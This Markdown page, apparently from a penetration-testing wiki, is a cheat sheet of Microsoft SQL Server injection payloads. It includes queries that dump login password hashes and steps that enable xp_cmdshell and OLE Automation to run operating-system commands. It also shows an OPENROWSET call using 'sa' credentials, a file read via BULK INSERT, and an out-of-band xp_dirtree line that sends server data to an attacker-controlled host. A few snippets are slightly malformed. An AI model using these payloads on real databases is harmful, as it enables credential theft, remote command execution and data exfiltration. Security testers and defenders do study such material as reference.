---
title: MSSQL
date: 2017-05-13 16:52:33
---


### Comments
```SQL
/* */
--
;%00
```

### Version
```SQL
SELECT @@version;
SELECT @@VERSION LIKE '%2008%';
```

### User details
```SQL
SELECT user;
SELECT current_user;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT USER_NAME(2);
SELECT SUSER_SNAME();
SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
```

### Database details
```SQL
SELECT DB_NAME();
SELECT DB_NAME(5);
SELECT name FROM master..sysdatabases;
```


### Database credentials
```SQL
SELECT name %2b ':'  %2b master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
```

### Server details
```SQL
SELECT @@servername; SELECT host_name(); SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel');
```


### Table Names
```SQL
SELECT name FROM master..sysobjects WHERE xtype='U';
SELECT table_name FROM information_schema.tables;
```

### Columns Names
```SQL
SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename';
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
```

### No Quotes
```SQL
SELECT * FROM Users WHERE username = CHAR(97) + CHAR(98) + CHAR(99);
ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) = 97;
ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) < 128;
```

### String Concatenation
```SQL
SELECT CONCAT('a','a','a');
SELECT 'a' %2b 'b' %2b 'c' %2b 'd';
```

### Conditionals
```SQL
IF 1=1 SELECT 'true' ELSE SELECT 'false';
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

### Time-delay
```SQL
WAITFOR DELAY 'time_to_pass';
WAITFOR TIME 'time_to_execute';
```

### Enable Command Execution
```SQL
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'xp_cmdshell', 1;
EXEC sp_configure reconfigure;
```

### Command Execution
```SQL
EXEC master.dbo.xp_cmdshell 'cmd';
```

### Enable Alternative Command Execution
```SQL
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'OLE Automation Procedures', 1;
EXEC sp_configure reconfigure;
```

### Alternative Command Execution
```SQL
DECLARE @execmd INT;
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%system32cmd.exe /c';
```

### RunAs
```SQL
SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'password', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
EXECUTE AS USER = 'FooUser';
```

### Read Files
```SQL
BULK INSERT dbo.temp FROM 'c:\foobar.txt' WITH ( ROWTERMINATOR='n' );
```

### Out-of-Band Retrieval
```SQL
;declare @q varchar(200);set @q='\attacker.controlledserver'+(SELECT SUBSTRING(@@version,1,9))+'.malicious.com/foo'; exec master.dbo.xp_dirtree @q; --  
```

### Substrings
```SQL
SUBSTRING(table_name,1,1) FROM information_schema.tables = 'A';
ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables > 96;
```

### Retrieve Nth Line
```SQL
SELECT TOP 1 table_name FROM information_schema.tables;
SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables);
```
